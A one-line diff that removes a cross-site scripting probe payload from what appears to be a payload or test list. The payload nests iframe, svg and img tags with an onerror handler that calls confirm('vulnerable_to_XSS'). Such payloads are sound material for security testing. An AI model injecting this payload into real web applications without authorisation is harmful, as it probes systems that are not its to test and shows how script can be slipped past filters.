@@ -1,1 +1,0 @@
-<iframe  src=""><svg><style><img src="" onerror=this.onerror=confirm('vulnerable_to_XSS')
